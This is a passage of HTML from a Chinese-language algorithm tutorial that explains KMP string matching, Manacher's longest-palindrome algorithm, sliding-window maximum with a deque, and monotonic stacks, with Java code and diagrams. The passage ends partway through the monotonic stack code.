class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="KMP"><a href="#KMP" class="headerlink" title="KMP"></a>KMP</h2><p>str1，str2 检测str2是否是str1的子串</p><p>显然str1长度&lt;str2长度的话，肯定不是其子串</p><p>经典暴力方法：</p><p>str1从0开始，str2从0开始，都开始比对，出现不一样的，</p><p>就str1从1开始，str2再次从0开始，出现不一样的，</p><p>str1从2开始，str2再次从0开始</p><p>下面介绍KMP，首先需要引入一个关于str2的数组</p><p>arr[i] 代表str2的第i位置不看，研究前面所有的i个字母，计算得出这i个字母的同样长度的前缀和后缀全部相等的最大的一个长度</p><blockquote><p>对于字符串”abbabbk”，看字母k往前的所有字母</p><table><thead><tr><th>长度</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th></tr></thead><tbody><tr><td>前缀</td><td>a</td><td>ab</td><td>abb</td><td>abba</td><td>abbab</td></tr><tr><td>后缀</td><td>b</td><td>bb</td><td>abb</td><td>babb</td><td>bbabb</td></tr></tbody></table><p>显然3是最大的长度，长度为6即包含了整个前面的字母，那么前后缀一定相等，所以不考虑长度6</p></blockquote><p>对于str2”aabaabsaabaabst”</p><p>数组arr</p><table><thead><tr><th>index</th><th>0、1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>…</th></tr></thead><tbody><tr><td>arr[index]</td><td>固定值-1，0</td><td>1</td><td>0</td><td>1</td><td>2</td><td>…</td></tr></tbody></table><p>str1 i, i+1, …, x</p><p>str2 0, 1, … y</p><p>比对过程中在x和y处发现不一样（即x之前的所有和y之前的所有完全一样），经典算法会选择str1回到i+1，str2回到0，然而KMP算法则不是这样</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/zuoshen-algorithm/algorithm4_f2.png"></p><p>str1会继续在x位置，str2则会回到最大前缀的下一个字符的位置，然后位置x和新的位置y开始进行比对</p><p>两个实质：</p><p>1）相当于str1从j位置开始，str2从0位置开始检查，但是由于前缀后缀相等的缘故，可以省略位置j到位置x-1的比对，直接比对x和新的位置y</p><p>2）从位置i到位置j之间的任何一个位置k开始，都一定不能配出str2</p><blockquote><p>证明：假设能配出str2的话，那么至少位置k到位置x-1是与str2的前(x-k)个字符是完全相等的，又已知x之前的所有和y之前的所有完全一样，即位置k到位置x-1是与str2从位置y往前移(x-k)个字符开始的串是完全一样的，这就说明一个更长的前缀后缀长度出现了，悖论！</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/zuoshen-algorithm/algorithm4_f3.png"></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/zuoshen-algorithm/algorithm4_f4.png"></p><p>图解过程：</p><p>首先第一次是e和w不一样，然后str2回到字母t，重新比对，</p><p>e跟t又不一样，str2回到字母s重新比对，</p><p>e跟s又又不一样，str2回到字母a重新比对，</p><p>又又又不一样，（说明我str2已经来到0位置还配不出来，str1换个开头吧）str1挪到e的下一个重新开始比对</p><blockquote><p>KMP算法最终会返回str1中子串str2的起始下标</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">KMP</span><span class="token punctuation">(</span><span class="token class-name">String</span> s1<span class="token punctuation">,</span> <span class="token class-name">String</span> s2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>s1 <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> s2 <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> s2<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">1</span> <span class="token operator">||</span> s1<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> s2<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> chars1 <span class="token operator">=</span> s1<span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> chars2 <span class="token operator">=</span> s2<span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr <span class="token operator">=</span> <span class="token function">getArray</span><span class="token punctuation">(</span>chars2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>i1 <span class="token operator">&lt;</span> chars1<span class="token punctuation">.</span>length <span class="token operator">&amp;&amp;</span> i2 <span class="token operator">&lt;</span> chars2<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>chars1<span class="token punctuation">[</span>i1<span class="token punctuation">]</span> <span class="token operator">==</span> chars2<span class="token punctuation">[</span>i2<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            i1<span class="token operator">++</span><span class="token punctuation">;</span>            i2<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>i2 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> i1<span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// 即str2已经跳到开头，还是不一样</span>        <span class="token keyword">else</span> i2 <span class="token operator">=</span> arr<span class="token punctuation">[</span>i2<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 跳出循环的结果是要么i2越界即i2全部比对成功，否则就是失败</span>    <span class="token keyword">return</span> i2 <span class="token operator">==</span> chars2<span class="token punctuation">.</span>length <span class="token operator">?</span> i1 <span class="token operator">-</span> i2 <span class="token operator">:</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>那么如何求数组arr</p><p>首先arr[0]和arr[1]都是固定值-1，0</p><p>arr[i]需要用到arr[i-1]，假设arr[i-1]记为cn，我们比较位置cn处的字母（即前缀后面的第一个字母）与i-1处的字母，如果相等，则arr[i]=cn+1</p><p>否则cn往前跳，cn=arr[cn]，重复之前的操作，比较位置cn处的字母与位置i-1，如果相等，则arr[i]=cn+1</p><p>跳到-1还不行就为0</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/zuoshen-algorithm/algorithm4_f5.png"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getArray</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> str<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> len <span class="token operator">=</span> str<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>len <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span>len<span class="token punctuation">]</span><span class="token punctuation">;</span>    arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    arr<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> cn <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>i <span class="token operator">&lt;</span> len<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">// 这是位置cn处的字母与位置i-1相等的情况，所以给arr[i]赋值为cn+1，随即i自增1</span>        <span class="token comment">// 那么下一个位置也就是新的arr[i]会使用arr[i-1]，也就是cn+1，所以为了精简代码，直接++cn</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>str<span class="token punctuation">[</span>cn<span class="token punctuation">]</span> <span class="token operator">==</span> str<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> arr<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">++</span>cn<span class="token punctuation">;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>cn <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> cn <span class="token operator">=</span> arr<span class="token punctuation">[</span>cn<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> arr<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> arr<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Manacher"><a href="#Manacher" class="headerlink" title="Manacher"></a>Manacher</h2><p>求解字符串的最长回文子串长度</p><h3 id="1-0-1"><a href="#1-0-1" class="headerlink" title="1.0"></a>1.0</h3><p>经典解法，对于字符串”1221ab”，插入特殊字符”#”，-&gt; “#1#2#2#1#a#b#”，然后从头开始，每个字母往两边扩，记录长度然后/2即为真正的以该字母为中心的（对于偶数长度回文子串就是以一个虚轴为中心）回文子串，显然这种暴力方法时间复杂度为O(n2)</p><blockquote><p>插入的特殊字符可以是字符串的字符，因为在比较的时候都是插入的特殊字符与插入的特殊字符比较，而原先的字符也只与原先的字符比较，井水不犯河水</p></blockquote><h3 id="2-0-1"><a href="#2-0-1" class="headerlink" title="2.0"></a>2.0</h3><p>对于Manacher方法来说，需要引入额外变量，</p><p>回文半径数组，即记录每个字母往两边扩得到的回文子串的半径</p><p>变量r，之前扩的所有位置中，所到达的最右回文子串的右边界位置（即只要有更加往右的回文子串，就更新r为该子串右边界）</p><p>变量c，变量r的这个子串的中心轴位置</p><p>r和c初始化都为-1</p><p>那么从头开始遍历</p><p>1）当前位置i &gt; r，只能从该位置开始向两边扩，扩充完成后，更新r和c</p><p>2）当前位置i&lt;=r，字符串情况如下</p><p>l, …, i’, …, c, …, i, …, r</p><p>i’即为i关于c对称的位置，于是有了下面3种情况</p><ol><li><p>以i’为中心的回文子串严格在l和r内部，l, ..(., i’, .).., c, …, i, …, r ，那么位置i的答案与位置i’的答案相同</p><blockquote><p>证明：l, ..x(., i’, .)y.., c, ..y(., i, .)x.., r</p><p>显然x不等于y，关于c对称，所以答案相同</p></blockquote></li><li><p>以i’为中心的回文子串严格在l外部，(…, l, …, i’, .).., c, …, i, …, r ，那么位置i的答案回文半径就是i - r这一段，(…, l, …, i’, .).., c, ..(…, i, …, r)</p><blockquote><p>证明：<img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/zuoshen-algorithm/algorithm4_f6.png"></p><p>l关于i’对称点l’，r关于i对称点r’，则甲乙两区域一定都是回文，因为在l和r之间关于c对称</p><p>x = y = z, x不等于p，所以z不等于p，所以回文子串只有r’到r</p></blockquote></li><li><p>以i’为中心的回文子串正好与l压线，那么位置r’到r这一段一定是回文，但是需要再往外扩检查是否是回文</p><p> <img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/zuoshen-algorithm/algorithm4_f7.png"></p></li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">manacherString</span><span class="token punctuation">(</span><span class="token class-name">String</span> str<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> chars <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> res <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span>chars<span class="token punctuation">.</span>length<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>res<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        res<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>i<span class="token operator">%</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">?</span> <span class="token string">'#'</span> <span class="token operator">:</span> chars<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">maxLength</span><span class="token punctuation">(</span><span class="token class-name">String</span> str<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>str <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> str<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> chars <span class="token operator">=</span> <span class="token function">manacherString</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span>chars<span class="token punctuation">.</span>length<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> r <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// 这里的r是右边界再往右一个位置</span>    <span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> res <span class="token operator">=</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span>MIN_VALUE<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>chars<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">// 先拿到至少不用检查的区域</span>        <span class="token comment">// 如果i在r外，只能向两边扩，所以至少自身这个字符是不需要检查的，至少不用检查的区域就是1</span>        <span class="token comment">// i在r内的情况，综合3种子情况来看，至少不用检查的区域第一种情况是arr[i']，比r-i小</span>        <span class="token comment">// 而第二种和第三种情况至少不用检查的区域就是r-i</span>        arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i <span class="token operator">></span> r <span class="token operator">?</span> <span class="token number">1</span> <span class="token operator">:</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>r<span class="token operator">-</span>i<span class="token punctuation">,</span> arr<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span>c<span class="token operator">-</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>        <span class="token comment">// 下面不管哪种情况，都开始往外扩检查</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>i <span class="token operator">+</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> chars<span class="token punctuation">.</span>length <span class="token operator">&amp;&amp;</span> i <span class="token operator">-</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>chars<span class="token punctuation">[</span>i <span class="token operator">+</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">==</span> chars<span class="token punctuation">[</span>i <span class="token operator">-</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// 往外扩发现有一样的，就+1</span>            <span class="token comment">// 虽然只有第一个大情况和第二个大情况的第3个子情况才真正的需要往外扩</span>            <span class="token comment">// 但是另外两种进入这个while循环会直接被break掉，所以代码精简，就可以这样写</span>            <span class="token keyword">else</span> <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">+</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> r<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            r <span class="token operator">=</span> i <span class="token operator">+</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            c <span class="token operator">=</span> i<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        res <span class="token operator">=</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token comment">// 带着特殊字符的回文半径-1即是真正回文子串长度</span>    <span class="token keyword">return</span> res <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>Manacher算法最重要的部分是回文半径数组，这个数组可以帮助我们解决很多问题</p></blockquote><h2 id="维持窗口最值"><a href="#维持窗口最值" class="headerlink" title="维持窗口最值"></a>维持窗口最值</h2><p>有一个数组，有一个窗口有左边界和右边界，左右边界都只能向右滑动，而且左边界不能超过右边界，要求能够随时得到窗口内的最大值</p><p>使用双端队列，存储数组下标，并且保证队列中从头到尾的值是严格从大到小的</p><p>右边界向右滑动时</p><p>1）该值大于等于队尾的值，弹出队尾，一直弹到小于队尾的值为止，然后把该值放到队列中（弹出去的就不需要管了）</p><p>2）该值小于队尾的值，就直接放到队尾即可</p><p>左边界向右滑动时，那么由于左边界滑动掉出窗口的该值</p><p>1）是队头的值，弹出队头</p><p>2）不是，就不用管</p><p>所以队头就一直是窗口中的最大值</p><blockquote><p>要求最小值的话就让队列从小到大</p></blockquote><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>有一个整型数组arr和一个大小为w的窗口从数组的最左边滑到最右边，窗口每次向右边滑一个位置</p><p>例如，数组为[4,3,5,4,3,3,6,7]，窗口大小为3时:</p><p>[4 3 5]4 3 3 6 7 窗口中最大值为5</p><p>4[3 5 4]3 3 6 7 窗口中最大值为5</p><p>4 3[5 4 3]3 6 7 窗口中最大值为5</p><p>4 3 5[4 3 3]6 7 窗口中最大值为4</p><p>4 3 5 4[3 3 6]7 窗口中最大值为6</p><p>4 3 5 4 3[3 6 7]  窗口中最大值为7</p><p>如果数组长度为n，窗口大小为w，则一共产生n-w+1个窗口的最大值。</p><p>请实现一个函数</p><p>输入：整型数组arr，窗口大小为w</p><p>输出：一个长度为n-w+1的数组res，res[i]表示每一种窗口状态下的以本题为例，结果应该返回{5,5,5,4,6,7}</p><blockquote><p>本题就是上面的结构的特殊化，每次左边界和右边界都是一起向右滑动</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">slidingWindowMax</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> w<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>arr <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> arr<span class="token punctuation">.</span>length <span class="token operator">&lt;</span> w <span class="token operator">||</span> w <span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token class-name">LinkedList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> res <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span>arr<span class="token punctuation">.</span>length <span class="token operator">-</span> w <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>list<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> arr<span class="token punctuation">[</span>list<span class="token punctuation">.</span><span class="token function">peekLast</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> list<span class="token punctuation">.</span><span class="token function">pollLast</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        list<span class="token punctuation">.</span><span class="token function">addLast</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 左边界滑动掉出窗口的该值是否是队头的值</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>list<span class="token punctuation">.</span><span class="token function">peekFirst</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> i <span class="token operator">-</span> w<span class="token punctuation">)</span> list<span class="token punctuation">.</span><span class="token function">pollFirst</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 形成窗口，取得最大值放在res中</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">>=</span> w<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> res<span class="token punctuation">[</span>i<span class="token operator">-</span>w<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>list<span class="token punctuation">.</span><span class="token function">peekFirst</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="单调栈"><a href="#单调栈" class="headerlink" title="单调栈"></a>单调栈</h2><p>数组，对每一个数，求这个数左边最近的比它大的位置，右边最近的比它大的位置</p><h3 id="1-0-无重复数字"><a href="#1-0-无重复数字" class="headerlink" title="1.0 无重复数字"></a>1.0 无重复数字</h3><p>设立一个栈，存储数组下标，从栈底到栈顶的值是从大到小，遍历数组</p><p>1）该值小于栈顶，入栈</p><p>2）该值大于栈顶，此时的栈顶出栈，开始得到这个出栈的栈顶的信息，左边最近的比它大的即为新栈顶（没有就是无），右边的即为等待入栈的该值（没有就是无），直到该值小于栈顶为止，入栈即可</p><p>3）清算阶段，遍历完成之后，如果栈中还有值的话，开始一个一个出栈，每个值的信息与2）同理</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">monotonousStackNoRepeat</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> stack <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> res <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span>arr<span class="token punctuation">.</span>length<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> arr<span class="token punctuation">[</span>stack<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> temp <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            res<span class="token punctuation">[</span>temp<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">:</span> stack<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token 